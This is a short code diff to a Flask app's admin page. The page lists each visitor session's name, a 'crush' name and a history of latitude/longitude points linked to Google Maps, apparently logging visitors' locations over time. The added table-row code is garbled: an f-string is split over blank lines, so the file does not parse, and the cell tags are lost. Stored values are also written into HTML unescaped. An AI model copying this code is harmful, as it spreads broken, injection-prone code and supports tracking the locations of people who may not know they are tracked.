@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, Response, render_template_string
+from flask import Flask, request, jsonify, Response
 from supabase import create_client, Client
 import os
 import random
@@ -19,7 +19,7 @@ else:
 
 SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"
 
-# ---------- Helper Functions (unchanged) ----------
+# ---------- Helper Functions ----------
 def save_visitor(data):
     if supabase is None:
         return
@@ -700,10 +700,30 @@ def admin():
                 if hist:
                     html += f'<h3>Session: {v.get("sessionId", "Unknown")} – {v.get("name", "Anonymous")} (crush: {v.get("crush_name", "?")})</h3>'
                     html += '<table border="1" cellpadding="3" style="margin-bottom:20px;">'
-                    html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th><tr>'
+                    html += '<tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                     for ts, lat, lon in hist:
                         map_link = f'https://www.google.com/maps?q={lat},{lon}'
-                        html += f'<tr><td style="white-space:nowrap;">{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="{map_link}" target="_blank">View</a></td></tr>'
+                        html += f'<tr><td style="white-space:nowrap;">{ts}</td>
+
+
+
+
+{lat}</td>
+
+
+
+
+{lon}</td>
+
+
+
+
+<a href="{map_link}" target="_blank">View</a></td>
+
+
+
+
+'
                     html += '</table>'
             return html
         else:
